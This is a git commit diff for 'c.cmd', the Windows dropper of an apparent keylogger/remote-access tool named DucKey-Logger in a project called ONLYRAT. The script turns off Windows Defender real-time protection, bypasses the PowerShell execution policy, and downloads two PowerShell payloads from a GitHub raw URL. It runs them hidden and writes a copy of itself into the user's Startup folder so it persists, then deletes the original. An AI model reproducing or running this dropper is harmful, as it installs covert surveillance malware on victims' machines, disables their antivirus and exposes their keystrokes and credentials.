7f419485a6622de3f9b2ea96278759f1498284fd
YouS0 <youned.creed.box@gmail.com>
2024-08-14 14:42:30 +0330

    update c.cmd

--- DucKey-Logger/c.cmd
+++ DucKey-Logger/c.cmd
@@ -1,7 +1,24 @@
 @echo off
+@REM variables
+set INITIALPATH=%cd%
+set STARTUPPATH=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
+
+cd %STARTUPPATH%
+
 powershell Set-MpPreference -DisableRealtimeMonitoring $true
 powershell Set-ExecutionPolicy -ExecutionPolicy ByPass -Scope Process
 powershell -C "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/YouS0/ONLYRAT/main/DucKey-Logger/p.ps1' -OutFile 'p.ps1'"
 powershell -C "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/YouS0/ONLYRAT/main/DucKey-Logger/l.ps1' -OutFile 'l.ps1'"
-powershell Start-Process powershell.exe -WindowStyle Hidden ".\l.ps1"
-powershell Start-Process powershell.exe -WindowStyle Hidden ".\p.ps1"
+(
+    echo powershell Set-MpPreference -DisableRealtimeMonitoring $true
+    echo powershell Set-ExecutionPolicy -ExecutionPolicy ByPass -Scope Process
+    echo powershell Start-Process powershell.exe -WindowStyle Hidden ".\l.ps1"
+    echo powershell Start-Process powershell.exe -WindowStyle Hidden ".\p.ps1"
+) > c.cmd
+powershell start-process -WindowStyle Hidden ".\c.cmd"
+@REM cd to initial path
+cd %INITIALPATH%
+
+@REM delete initial.cmd
+del c.cmd
+
